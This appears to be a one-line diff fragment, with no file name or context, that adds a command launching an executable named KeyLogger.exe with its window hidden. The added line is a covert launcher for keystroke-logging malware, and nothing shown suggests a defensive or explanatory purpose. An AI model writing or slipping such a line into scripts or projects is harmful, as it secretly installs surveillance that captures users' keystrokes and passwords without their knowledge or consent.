@@ -1,0 +1,1 @@
+start KeyLogger.exe -WindowStyle Hidden
